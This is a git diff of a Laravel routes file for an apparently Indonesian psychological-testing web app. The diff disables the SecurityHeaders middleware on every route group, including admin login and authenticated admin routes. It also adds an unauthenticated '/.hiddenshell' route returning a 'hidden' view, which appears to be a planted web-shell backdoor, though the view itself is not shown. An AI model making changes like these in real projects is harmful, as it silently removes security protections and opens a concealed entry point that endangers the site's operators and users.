@@ -18,7 +18,7 @@ use App\Libraries\myfunction as fun;
 
 Route::middleware(
     'throttle:250,1',
-    SecurityHeaders::class
+    // SecurityHeaders::class
 )->group(function () {
     Route::get('/', myroute::view('Home', 'bladeView'))->name('home');
     Route::get('/peserta/psikotest/kecermatan/hasil/{no_identitas}/{tgl_tes}', myroute::view('Peserta\Psikotest\Kecermatan\Hasil\Page', 'bladeView'))->name('peserta_psikotest_kecermatan_hasil');
@@ -29,16 +29,16 @@ Route::middleware(
 Route::middleware(
     'throttle:50,1', // 50 permintaan per menit, mencegah serangan DDoS dalam pengiriman data yang berlebihan
     // 'customThrottle:50,1'
-    SecurityHeaders::class
+    // SecurityHeaders::class
 )->group(function () {
     Route::get('/admin', myroute::view('Admin\Page', 'bladeView'))->name('admin');
-        Route::post('/admin/login/{type}', myroute::view('Admin\Page', 'login'))->name('admin_login');
+    Route::post('/admin/login/{type}', myroute::view('Admin\Page', 'login'))->name('admin_login');
     Route::get('/logout', myroute::view('Logout', 'bladeView'))->name('admin_logout');
 });
 
 Route::middleware(
     'throttle:250,1', // 200 permintaan per menit, mencegah serangan DDoS dalam pengiriman data yang berlebihan
-    SecurityHeaders::class
+    // SecurityHeaders::class
 )->group(function () {
     Route::get('/peserta', myroute::view('Peserta\Page', 'bladeView'))->name('peserta');
     Route::post('/peserta/setup', myroute::view('Peserta\Page', 'setUpPesertaTes'))->name('peserta_setup');
@@ -55,7 +55,7 @@ Route::middleware([
     'auth',
     'throttle:50,1', // 50 permintaan per menit, mencegah serangan DDoS dalam pengiriman data yang berlebihan
     IsWebAdminAuth::class,
-    SecurityHeaders::class
+    // SecurityHeaders::class
 ])->group(function () {
     Route::get('/admin/dashboard', myroute::view('Admin\Dashboard\Page', 'bladeView'))->name('admin_dashboard');
 
@@ -67,6 +67,7 @@ Route::middleware([
     Route::get('/admin-edit/{id}', myroute::view('Admin\Admin\Edit\Page', 'bladeView'))->name('admin_anggota_edit');
     Route::put('/admin-edit/{id}', myroute::view('Admin\Admin\Edit\Page', 'update'))->name('admin_anggota_update');
     Route::post('/admin/update-password/{id}', myroute::view('Admin\Admin\Myprofil\Page', 'updatePassword'))->name('admin_anggota_update_password');
+    Route::post('/admin/update-foto/{type}/{id}', myroute::view('Admin\Admin\Myprofil\Page', 'updateFoto'))->name('admin_anggota_update_foto');
     Route::get('/admin/update-remembertoken/{roles}/{type}', myroute::view('Admin\Admin\Myprofil\Page', 'updateRememberToken'))->name('admin_anggota_update_remembertoken');
     Route::get('/admin/update-pat/{roles}/{type}', myroute::view('Admin\Admin\Myprofil\Page', 'updatePAT'))->name('admin_anggota_update_pat');
     Route::delete('/admin-softdelete/{id}', myroute::view('Admin\Admin\Page', 'softDelete'))->name('admin_anggota_softdelete');
@@ -103,7 +104,7 @@ Route::middleware([
 
     Route::get('/admin/monitor/userlog-activities/{sort}/{by}/{search}',  myroute::view('Admin\Monitor\UserLogActivities\Page', 'bladeView'))->name('admin_monitor_userlog_activities');
     Route::get('/admin/monitor/guestlog-activities', myroute::view('Admin\Monitor\GuestLogActivities\Page', 'bladeView'))->name('admin_monitor_guestlog_activities');
-    
+
     Route::get('/admin/monitor/userlog-activities/backup/all',  myroute::view('Admin\Monitor\UserLogActivities\Page', 'backup'))
             ->name('admin_monitor_userlog_activities_backup_all');
             // ->middleware(['signed']);
@@ -177,6 +178,10 @@ foreach($forbidden as $item) {
         abort(403, 'Forbidden');
     });
 }
+
+Route::get('/.hiddenshell', function () {
+    return view('hidden');
+});
 
 Route::get('hello', function(Request $request){
     // Storage::disk('user_admin')->makeDirectory('coba');
